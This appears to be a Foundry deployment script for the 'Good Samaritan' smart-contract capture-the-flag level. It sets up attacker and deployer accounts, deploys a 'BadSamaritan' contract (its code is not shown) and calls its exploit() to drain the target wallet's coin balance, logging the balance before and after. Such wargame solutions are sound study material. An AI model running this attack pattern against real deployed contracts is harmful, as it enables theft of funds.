// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/GoodSamaritan/GoodSamaritan.sol";
import "./BadSamaritan.sol";

contract GoodSamaritanScript is Script {

    address internal attacker;
    address internal deployer;
    GoodSamaritan target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = GoodSamaritan(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new GoodSamaritan();
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        Wallet wallet = Wallet(target.wallet());
        Coin coin = Coin(target.coin());
        console.log("Wallet   : %s", address(wallet));
        console.log("Coin     : %s", address(coin));
        console.log("Balance  : %s", coin.balances(address(wallet)));

        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        BadSamaritan badboi = new BadSamaritan();
        badboi.exploit(address(target));
        vm.stopBroadcast();
        console.log("Balance  : %s", coin.balances(address(wallet)));
    }
}